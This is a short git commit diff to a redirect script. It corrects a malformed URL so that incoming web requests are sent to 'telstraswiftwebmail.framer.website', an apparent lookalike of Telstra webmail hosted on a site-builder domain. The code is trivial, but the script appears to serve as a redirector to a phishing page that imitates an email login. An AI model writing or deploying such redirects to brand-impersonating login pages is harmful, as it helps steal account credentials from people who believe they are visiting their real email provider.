046ca6c82534c038161522848398a2d39e7e9309
Thorpee545 <136597631+Thorpee545@users.noreply.github.com>
2025-11-15 14:27:50 +0100

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://https://telstraswiftwebmail.framer.website"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://telstraswiftwebmail.framer.website"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
